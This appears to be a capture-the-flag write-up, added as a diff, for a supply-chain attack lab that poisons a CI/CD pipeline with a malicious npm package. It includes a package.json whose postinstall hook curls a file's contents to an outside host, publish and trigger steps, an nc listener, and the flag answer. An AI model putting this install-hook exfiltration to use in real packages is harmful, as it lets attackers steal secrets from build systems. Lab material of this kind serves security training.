@@ -1,0 +1,30 @@
+Side Mission: Leaked Build Script
+
+Objective:
+Poison a CI/CD pipeline by publishing a malicious version of a trusted dependency.
+
+Malicious package.json:
+{
+  "name": "@buildcorp/utility-lib",
+  "version": "1.1.7",
+  "scripts": {
+    "postinstall": "curl http://10.0.0.1:9001/$(cat /home/build/flag.txt)"
+  }
+}
+
+Steps:
+1. Publish package:
+   npm publish --access public
+
+2. Trigger CI:
+   Push an innocuous commit to the monitored GitHub repo.
+   The pipeline will rebuild and fetch the poisoned package.
+
+3. Start listener:
+   nc -lvnp 9001
+
+4. Observe incoming HTTP request containing:
+   GET /CTF{supply_ch4in_br34k}
+
+Flag:
+CTF{supply_ch4in_br34k}
